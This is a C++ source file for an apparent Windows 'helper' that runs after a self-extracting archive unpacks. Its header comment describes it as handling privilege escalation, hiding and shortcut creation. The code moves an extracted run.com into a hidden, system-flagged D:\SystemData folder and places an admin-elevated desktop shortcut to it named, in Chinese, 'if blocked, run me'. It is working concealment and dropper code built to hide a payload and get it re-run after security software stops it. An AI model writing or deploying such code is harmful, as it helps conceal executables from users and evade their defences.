// helper.exe - 7z SFX 解压后执行的提权+隐藏+建快捷方式
#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#ifndef SLDF_RUNAS_USER
#define SLDF_RUNAS_USER 0x00000020
#endif

int main() {
    // 当前目录就是 7z SFX 解压目录（%TEMP% 或指定目录）
    wchar_t cur[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, cur);
    wchar_t src[MAX_PATH]; wcscpy(src, cur); wcscat(src, L"\\run.com");
    wchar_t dst[MAX_PATH]; wcscpy(dst, L"D:\\SystemData");
    
    // 创建隐藏目录
    CreateDirectoryW(dst, NULL);
    SetFileAttributesW(dst, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // 移动 .com 过去并隐藏
    wchar_t out[MAX_PATH]; wcscpy(out, dst); wcscat(out, L"\\run.com");
    MoveFileExW(src, out, MOVEFILE_REPLACE_EXISTING);
    SetFileAttributesW(out, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // 桌面快捷方式
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    IShellLinkW* psl = NULL;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl)) && psl) {
        psl->SetPath(out);
        IShellLinkDataList* pdl = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IShellLinkDataList, (void**)&pdl)) && pdl) {
            DWORD f = 0; pdl->GetFlags(&f); pdl->SetFlags(f | SLDF_RUNAS_USER); pdl->Release();
        }
        IPersistFile* ppf = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf)) && ppf) {
            ppf->Save(L"D:\\Desktop\\如果被拦截运行我.com", TRUE); ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
    return 0;
}
